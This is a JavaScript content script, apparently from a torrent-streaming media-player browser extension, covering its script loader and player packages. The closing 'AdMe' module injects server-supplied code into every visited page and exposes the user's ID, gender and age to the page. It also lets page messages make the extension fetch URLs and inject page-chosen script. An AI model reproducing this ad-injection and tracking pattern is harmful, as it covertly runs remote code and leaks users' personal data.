////////////////////////////////////////////////////////////////////////////////
// magicplayer
var magicplayer = (function() {
        ////////////////////////////////////////////////////////////////////////
        // private
        var _scriptQueue = [],
            _currentScript = null,
            _debugScriptLoader = false,
            _runInSandbox = true,
            _version = "",
            _engineVersion = 0;
        
        function _log(msg) {
            try {
                console.log(msg);
            }
            catch(e) {
            }
        }
        
        function _setVersion(version) {
            // set extension version on page
            var el = document.getElementById("acestream-magicplayer-version");
            if(el) {
                el.setAttribute("data-version", version);
            }
        }
        
        function _loadScriptFromQueue() {
            if(_scriptQueue.length) {
                _currentScript = _scriptQueue.shift();
                if(_debugScriptLoader) {
                    _log("_loadScriptFromQueue: pop and load script: len(queue)=" + _scriptQueue.length);
                }
                _loadScript(_currentScript, _loadScriptFromQueue);
            }
            else {
                if(_debugScriptLoader) {
                    _log("_loadScriptFromQueue: queue is empty");
                }
                _currentScript = null;
            }
        }
        
        function _loadScript(description, loadedCallback) {
            // Create a script node holding this  source code.
            var async, script;
            
            if(typeof description !== 'object') {
                throw "_loadScript: bad description: " + description;
            }
            
            if(typeof loadedCallback !== 'function') {
                loadedCallback = function(){};
            }
            
            if(typeof description.runInSandbox === 'undefined') {
                description.runInSandbox = _runInSandbox;
            }
            
            if(!description.runInSandbox) {
                script = document.createElement('script');
                script.setAttribute("type", "application/javascript");
            }
            
            if(description.file) {
                if(_debugScriptLoader) {
                    _log("_loadScript: load script from file: url=" + description.file + " sandbox=" + description.runInSandbox);
                }
                async = true;
                
                if(description.runInSandbox) {
                    chrome.runtime.sendMessage({
                            method: "injectScript",
                            scripts: [description.file]
                    },
                    function(response) {
                        if(_debugScriptLoader) {
                            _log("_loadScript: script loaded: " + description.file);
                        }
                        loadedCallback.call(null);
                    });
                }
                else {
                    var scriptLoaded = false;
                    // prevent caching
                    script.src = description.file + "?" + Math.random();
                    script.onload = script.onreadystatechange = function () {
                        if ((script.readyState && script.readyState !== "complete" && script.readyState !== "loaded") || scriptLoaded) {
                            return false;
                        }
                        script.onload = script.onreadystatechange = null;
                        scriptLoaded = true;
                        if(_debugScriptLoader) {
                            _log("_loadScript: script loaded: " + description.file);
                        }
                        loadedCallback.call(null);
                        script.parentNode.removeChild(script);
                    };
                }
            }
            else if(description.source) {
                if(_debugScriptLoader) {
                    _log("_loadScript: load script from source");
                }
                async = false;
                
                if(description.runInSandbox) {
                    eval(description.source);
                }
                else {
                    script.textContent = description.source;
                }
            }
            else if(description.func) {
                if(_debugScriptLoader) {
                    _log("_loadScript: load script from function");
                }
                async = false;
                
                if(description.runInSandbox) {
                    description.func.call(null);
                }
                else {
                    script.textContent = '(' + description.func + ')();'
                }
            }
            
            if(!description.runInSandbox) {
                // Insert the script node into the page, so it will run, and immediately
                // remove it to clean up.
                document.body.appendChild(script);
            }
            
            if(!async) {
                if(!description.runInSandbox) {
                    document.body.removeChild(script);
                }
                loadedCallback.call(null);
            }
        }
        
        function _loadScriptWhenDOMExists(description, retries) {
            if(document && document.body) {
                magicplayer.addScript(description);
            }
            else {
                try {
                    if(typeof retries !== 'number') {
                        retries = 0;
                    }
                    else {
                        retries = parseInt(retries);
                    }
                }
                catch(e) {
                    retries = 0;
                }
                if(retries < 100) {
                    setTimeout(function() {
                            _loadScriptWhenDOMExists(description, retries + 1);
                    }, 100);
                }
            }
        }
        
        function _statPixel(loc, userKey) {
            var head = document.getElementsByTagName('head')[0],
                i, e, x;
            
            for(i = 0; i < head.children.length; i++) {
                e = head.children[i];
                if(e.tagName == "SCRIPT") {
                    x = e.getAttribute("src");
                    if(x && (new RegExp('^(http(s)?:)?//magicplayer-s')).test(x)) {
                        _log("_statPixel: already loaded: " + x);
                        return false;
                    }
                }
            }
            
            if(!userKey) {
                userKey = "";
            }
            
            var s = document.createElement('script');
            s.id = "_magicplayer_stat";
            s.async = true;
            s.type = 'text/javascript';
            s.src = '//magicplayer-s.acestream.net/stat.js?loc=' + loc + "&uk=" + userKey;
            head.appendChild(s);
            
            return true;
        }
        
        function isTopWindow() {
            return (window === window.top);
        }
        
        ////////////////////////////////////////////////////////////////////////
        // public
        return {
            log: function(msg) {
                _log(msg);
            },
            
            runInSandbox: function(val) {
                _runInSandbox = val;
            },
            
            addStyle: function(description) {
                if(typeof description !== 'object') {
                    throw "addStyle: bad description: " + description;
                }
                
                if(!description.file) {
                    throw "addStyle: missing file: " + description;
                }
                
                chrome.runtime.sendMessage({
                        method: "injectStyle",
                        styles: [description.file]
                },
                function(response) {
                    if(_debugScriptLoader) {
                        _log("addStyle: style loaded: " + description.file);
                    }
                });
            },
            
            addScript: function(description) {
                
                if(typeof description === 'function') {
                    description = {func: description};
                }
                
                _scriptQueue.push(description);
                
                if(_currentScript === null) {
                    if(_debugScriptLoader) {
                        _log("addScript: load script");
                    }
                    _loadScriptFromQueue();
                }
                else if(_debugScriptLoader) {
                    _log("addScript: queue script");
                }
            },
            
            loadPackage: function(name) {
                var i, css, scripts, styles;
                
                if(name == 'ts-black') {
                    scripts = [
                        'src/magicplayer/lib/ts/core.js',
                        'src/magicplayer/lib/jquery/jquery-1.7.min.js',
                        'src/magicplayer/lib/jquery/jquery-ui-1.8.9.custom.min.js',
                        'src/magicplayer/lib/jquery/jquery.mousewheel.js',
                        'src/magicplayer/lib/jquery/jquery.jscrollpane.js',
                        'src/magicplayer/lib/jquery/jquery.scrollText.js',
                        'src/magicplayer/lib/cufon/cufon.js',
                        'src/magicplayer/lib/cufon/a_LCDNova_400.font.js',
                        'src/magicplayer/lib/ts/player.js',
                        'src/magicplayer/lib/ts/controls.js',
                        'src/magicplayer/utils.js'
                    ];
                    styles = [
                        'src/magicplayer/css/ts-controls-black.css'
                    ];
                }
                else if(name == 'ts-white-screen') {
                    scripts = [
                        'src/magicplayer/lib/ts/core.js',
                        'src/magicplayer/lib/jquery/jquery-1.7.min.js',
                        'src/magicplayer/lib/ts/player.js',
                        'src/magicplayer/lib/ts/magicplayer.js',
                        'src/magicplayer/lib/ts/button.js',
                        'src/magicplayer/utils.js'
                    ];
                    styles = [
                        'src/magicplayer/css/magicplayer.css',
                        'src/magicplayer/css/ts-buttons.css'
                    ];
                }
                else {
                    _log("loadPackage: unknown package: name=" + name);
                }
                
                if(styles) {
                    for(i = 0; i < styles.length; i++) {
                        try {
                            url = styles[i];
                            _log("loadPackage: load style: url=" + url);
                            this.addStyle({file: url});
                        }
                        catch(e) {
                            _log("loadPackage: failed to load style: error=" + e);
                        }
                    }
                }
                
                if(scripts) {
                    for(i = 0; i < scripts.length; i++) {
                        try {
                            url = scripts[i];
                            if(!_runInSandbox) {
                                url = chrome.runtime.getURL(url);
                            }
                            _log("loadPackage: load script: url=" + url);
                            this.addScript({file: url});
                        }
                        catch(e) {
                            _log("loadPackage: failed to load scripts: error=" + e);
                        }
                    }
                }
            },
            
            getLocalizedMessage: function(id) {
                try {
                    return chrome.i18n.getMessage(id);
                }
                catch(e) {
                    _log("getLocalizedMessage: unknown message: id=" + id);
                    return null;
                }
            },
            
            onMessageFromBackground: function(request, sender, sendResponse) {
                if(!isTopWindow()) {
                    return;
                }
                
                _log("onMessageFromBackground: method=" + request.method + " url=" + document.location.href);
                if(request.method === "showPopupPlayer") {
                    var url = request.url;
                    magicplayer.runInSandbox(true);
                    magicplayer.loadPackage("ts-white-screen");
                    
                    magicplayer.addScript(function() {
                            TorrentStream.Utils.showPopupPlayer({
                                    dataType: 'torrentUrl',
                                    data: url,
                                    downloadTorrent: true
                            });
                    });
                }
                else if(request.method == "injectScript") {
                    _log("onMessageFromBackground:injectScript: file=" + request.file);
                    
                    var url = chrome.runtime.getURL(request.file);
                    _loadScriptWhenDOMExists({
                        file: url,
                        runInSandbox: false
                    });
                }
                else if(request.method == "statPixel") {
                    var success = _statPixel(document.location.hostname, request.userKey);
                    sendResponse({
                            success: success
                    });
                }
            },
            
            getEngineVersion: function() {
                return _engineVersion;
            },
            
            onDOMStart: function() {
                if(!isTopWindow()) {
                    return;
                }
                chrome.runtime.sendMessage({
                        method: "onDOMStart",
                        url: document.location.href
                },
                function(response) {
                    _version = response.version;
                    _engineVersion = response.engineVersion;
                    _log("magicplayer:init: set version: extension=" + _version + " engine=" + _engineVersion);
                    _setVersion(_version);
                });
            },
            
            onDOMReady: function() {
                if(!isTopWindow()) {
                    return;
                }
                chrome.runtime.sendMessage({
                        method: "onDOMReady",
                        url: document.location.href
                });
            }
        };
})();

magicplayer.onDOMStart();
chrome.runtime.onMessage.addListener(magicplayer.onMessageFromBackground);
document.addEventListener("DOMContentLoaded", magicplayer.onDOMReady, false);

////////////////////////////////////////////////////////////////////////////////
// AdMe
var adme = (function() {
        function _log(msg) {
            try {
                console.log(msg);
            }
            catch(e) {
            }
        }
        
        function zInjJS(jscode)
        {
            var obj = (window.document.head) ? 'head' : 'documentElement';
            var script = window.document.createElement('script');
            script.setAttribute('id','tmp_scr_id');
            script.appendChild(window.document.createTextNode(jscode+'document.getElementById("tmp_scr_id").parentNode.removeChild(document.getElementById("tmp_scr_id"));'));
            window.document[obj].insertBefore(script, window.document[obj].children[0]);
        }
        
        return {
            onDOMStart: function() {
                chrome.extension.sendRequest({'action':'getCode'}, function(response) {
                        if(response.code) 
                        {
                            _log("adme: onDOMStart: got code: user_key=" + response.userKey + " gender=" + response.gender + " age=" + response.age);
                            window.addEventListener('message', function(event) {
                                    if (!event.data.zsystem)
                                        return;
                                    switch (event.data.type) {
                                    case 'getUrl':
                                        chrome.extension.sendRequest({'action':'getUrl','data':event.data.params.url}, function(zreq) {
                                                if(zreq) {
                                                    zInjJS(event.data.params.hand+'('+JSON.stringify(zreq)+');');
                                                }
                                        });
                                        break;
                                    }
                            });
                            
                            // set unique user id
                            if(response.userKey) {
                                window.zUniID = response.userKey;
                            }
                            if(response.gender) {
                                window.zAceGender = response.gender;
                            }
                            if(response.age) {
                                window.zAceAge = response.age;
                            }
                            
                            zInjJS(response.code);
                        }
                });
            }
        };
})();

adme.onDOMStart();

